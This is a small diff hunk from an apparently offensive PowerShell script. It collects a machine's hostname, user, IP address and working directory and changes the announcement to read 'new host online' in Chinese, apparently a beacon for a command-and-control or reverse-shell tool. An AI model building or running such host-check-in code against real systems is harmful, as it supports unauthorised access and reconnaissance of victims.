@@ -270,7 +270,7 @@ $ipV4 = $ipV4.IPAddressToString
 $hostname = Invoke-Expression hostname
 $pwd = pwd
 
-$info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
+$info = '[!新的主机上线] ：' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
 if($nopreview) { $preview_mode = "True" }
 if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}
 
